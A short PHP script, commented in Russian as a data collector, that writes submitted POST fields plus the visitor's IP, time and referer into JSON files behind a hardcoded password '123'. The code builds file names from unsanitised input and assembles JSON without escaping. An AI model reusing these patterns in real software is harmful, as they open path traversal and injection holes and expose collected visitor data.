<?php /*
Сбор данных
h7 - пароль
t - буквы в начале названия
*/


if($_POST['h7']=='123'){
	unset($_POST['h7']);
	
$type=$_POST['t'];
unset($_POST['t']);
	
$file='k.php';$k=file_get_contents($file);
if($k==''){exit('[X] sbil k.php');$k=1;}else{$k++;}
file_put_contents($file, $k); 




	
	
	
	$str='{
		';
	foreach($_POST as $key => $value){
		$str.='"'.$key.'":"'.$value.'",
		';
	}
	$str.='"h7":{
	"id":"'.$k.'",
	"time":"'.date("d.m.y H:i").'",
	"ip":"'.$_SERVER['REMOTE_ADDR'].'",
	"url":"'.$_SERVER['REQUEST_SCHEME'].'",
	"from_url":"'.$_SERVER['HTTP_REFERER'].'"
}}';

	echo $str;




$name='./'.$type.'_'.$k.'('.date("d_m_y)(H_i_s").')'.rand(5, 15).'.json';



		$fp = fopen($name, "w");
		fwrite($fp, $str);
		fclose($fp);

		if(file_exists($name)){
			echo '[V]';			
		}else{
			echo '[X]';
		}	


}



?>

